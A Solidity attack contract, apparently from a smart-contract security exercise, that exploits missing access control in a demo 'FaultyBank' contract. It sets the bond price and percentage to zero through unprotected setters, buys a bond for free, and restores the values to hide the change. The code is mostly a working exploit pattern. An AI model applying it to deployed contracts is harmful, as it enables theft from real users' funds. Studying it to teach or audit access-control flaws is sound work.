// SPDX-License-Identifier: MIT
/*
   We implement a malicious constract to enact the access control attack.
*/

pragma solidity ^0.8.19;

import "hardhat/console.sol"; // We want to print messages on the console.

// need an interface in order to interact with the smart contract FaultyBank.sol
interface IFaultyBank {
    function BuyBond() external payable;
    function Bond() external view;
    function BondPrice() external view returns (uint256);
    function BondPercentage() external view returns (uint256);
    function SetBondPrice(uint256 new_bond_price) external;
    function SetBondPercentage(uint256 new_bond_percentage) external;
}

contract AccessControlAttack {

    // Addresses
    IFaultyBank public immutable FaultyBank;
    address private owner;

    // contructor function called at the creation of the contract
    // we initialize the FaultyBank and the owner
    constructor (address init_FaultyBank) {
        FaultyBank = IFaultyBank(init_FaultyBank);
        owner = msg.sender;
    }

    // we fix a control such that only the owner of the contract can call the functions
    // we introduce a modifier

    modifier Ownership() {
        require(owner == msg.sender, "Only the owner can interact with this contract.");
        _;
    }

    // attack function
     function Attack() external payable Ownership {

        uint256 init_bond_price = FaultyBank.BondPrice();
        uint256 init_bond_percentage = FaultyBank.BondPercentage();
        console.log(init_bond_price);
        console.log(init_bond_percentage);
        
        console.log("Attempting to change the prices to 0...");
        FaultyBank.SetBondPrice(0);
        console.log("Attempting to change the percentage to 0...");
        FaultyBank.SetBondPercentage(0);
        console.log("Attempting to buy bonds...");
        FaultyBank.BuyBond();

        // restore prices and percentages
        console.log("Attempting to restore the price...");
        FaultyBank.SetBondPrice(init_bond_price);
        console.log("Attempting to restore the percentage...");
        FaultyBank.SetBondPercentage(init_bond_percentage);

        console.log("Attack completed.");

    }

}